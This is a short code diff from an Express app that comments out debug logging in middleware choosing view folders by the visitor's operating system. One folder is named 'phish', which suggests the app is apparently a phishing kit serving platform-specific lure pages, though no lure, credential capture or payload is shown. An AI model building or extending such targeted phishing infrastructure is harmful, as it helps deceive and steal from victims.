@@ -17,7 +17,7 @@ app.use('/', (req, res, next) => {
  // console.log(ua.os)
   if (ua.os.family === 'Windows')
   {
-    console.log(ua.os)
+    // console.log(ua.os)
     app.set('views', [ 
 
       path.join(__dirname, 'views/Windows-DarkMode-Delay'),
@@ -27,7 +27,7 @@ app.use('/', (req, res, next) => {
       ]);
   }
   else {
-    console.log("na here we dey");
+    // console.log("na here we dey");
     app.set('views', [
       path.join(__dirname, 'views/Windows-DarkMode-Delay/mobile'),
       path.join(__dirname, 'views/phish'),
